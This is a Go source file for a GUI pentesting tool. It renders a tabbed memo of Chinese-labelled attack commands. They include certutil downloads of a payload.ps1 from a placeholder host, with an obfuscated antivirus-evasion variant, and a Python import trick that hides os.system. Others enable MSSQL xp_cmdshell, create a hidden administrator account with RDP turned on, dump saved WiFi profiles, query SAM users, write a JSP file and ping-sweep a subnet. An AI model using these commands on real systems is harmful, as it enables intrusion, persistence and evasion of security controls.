package module

import (
	"slack/gui/custom"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/container"
)

func MemoItem() *fyne.Container {
	c := container.NewAppTabs(
		container.NewTabItem("Windows下载文件", custom.NewMultiLineEntryText(WindowsDownload())),
		container.NewTabItem("Python动态导入绕过", custom.NewMultiLineEntryText(PythonImportlib())),
		container.NewTabItem("Mssql一键执行命令", custom.NewMultiLineEntryText(`EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;exec master..xp_cmdshell 'whoami';`)),
		container.NewTabItem("显示系统中曾连过的WIFI密码", custom.NewMultiLineEntryText("netsh wlan show profiles")),
		container.NewTabItem("查看系统是否为Vmware", custom.NewMultiLineEntryText(`wmic bios list full | find /i "vmware"`)),
		container.NewTabItem("Windows查看计划任务", custom.NewMultiLineEntryText("schtasks /QUERY /fo LIST /v")),
		container.NewTabItem("Windows添加用户并开启3389", custom.NewMultiLineEntryText(RDP())),
		container.NewTabItem("Windows注册表查看所有用户", custom.NewMultiLineEntryText(`reg query HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names`)),
		container.NewTabItem("Windows查找文件", custom.NewMultiLineEntryText(`dir c:\ /s /b | find "win.ini"`)),
		container.NewTabItem("Windows写文件", custom.NewMultiLineEntryText(`echo ^xxxx >> C:/x.jsp`)),
		container.NewTabItem("Linux ping探活", custom.NewMultiLineEntryText(`for i in 192.168.0.{1..254}; do if ping -c 3 -w 3 $i &>/dev/null; then echo $i is alived; fi; done`)),
	)
	c.SetTabLocation(1)
	return container.NewBorder(nil, nil, nil, nil, c)
}

func PythonImportlib() string {
	return `import importlib

# 拼接字符串为模块名
module_name = "o" + "s"

# 动态导入模块
ss = importlib.import_module(module_name)
# 执行os模块的操作
ss.system("whoami")`
}

func WindowsDownload() string {
	return `certutil -urlcache -split -f http://xxx.cn/test.txt

(绕过杀软) start cert^u^t^il -url""""cache -sp""""lit -f http://x.x.x.x:8080/payload.ps1`
}

func RDP() string {
	return `添加用户并添加到管理员组
net user Guest01$ Aa123456. /add
net localgroup Administrators Guest01$ /add

开启3389
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f

	`
}
